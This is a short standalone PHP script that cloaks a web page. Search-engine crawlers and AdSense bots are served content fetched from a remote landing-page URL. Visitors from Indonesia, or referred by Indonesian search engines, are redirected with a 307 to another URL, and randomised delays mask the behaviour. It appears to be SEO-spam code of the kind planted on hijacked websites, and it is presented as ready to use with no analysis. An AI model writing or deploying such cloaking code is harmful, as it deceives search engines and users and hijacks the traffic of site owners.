<?php
ob_start();
header('Vary: Accept-Language');
header('Vary: User-Agent');

function get_client_ip() {
    return $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['HTTP_X_FORWARDED'] ?? $_SERVER['HTTP_FORWARDED_FOR'] ?? $_SERVER['HTTP_FORWARDED'] ?? $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
}

function lph_requests($url) {
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
        $response = curl_exec($ch);
        curl_close($ch);
        return $response;
    } elseif (ini_get('allow_url_fopen')) {
        return file_get_contents($url);
    }
    return false;
}

$ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
$rf = isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : '';
$ip = get_client_ip();

$bot_url = "LINK LP";
$reff_url = "LINK YTTA";

$file = lph_requests($bot_url);

$geolocation = json_decode(lph_requests("http://ip-api.com/json/$ip"), true);

$cc = $geolocation['countryCode'] ?? null;

$botchar = "/(googlebot|slurp|adsense|inspection)/";

$fingerprint = md5($ua . $ip . $_SERVER['HTTP_ACCEPT_LANGUAGE'] . $_SERVER['HTTP_ACCEPT_ENCODING']);

if (preg_match($botchar, $ua)) {
    usleep(rand(150000, 350000));
    echo $file;
    ob_end_flush();
    exit;
}

if ($cc === "ID" || $fingerprint === "known_bad_fingerprint") {
    usleep(rand(75000, 200000));
    http_response_code(307);
    header("Location: $reff_url");
    ob_end_flush();
    exit();
}

if (!empty($rf) && (stripos($rf, "yahoo.co.id") !== false || stripos($rf, "google.co.id") !== false || stripos($rf, "bing.com") !== false)) {
    usleep(rand(100000, 250000));
    http_response_code(307);
    header("Location: $reff_url");
    ob_end_flush();
    exit();
}
?>
